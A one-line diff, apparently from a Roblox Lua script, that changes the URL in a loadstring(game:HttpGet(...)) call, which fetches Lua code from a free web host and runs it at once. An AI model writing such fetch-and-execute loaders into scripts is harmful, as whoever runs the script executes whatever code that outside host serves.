@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://testisntfun.000webhostapp.com/Commands.lua"))();
+loadstring(game:HttpGet("https://testisntfun.000webhostapp.com/Commanda.lua.php"))();
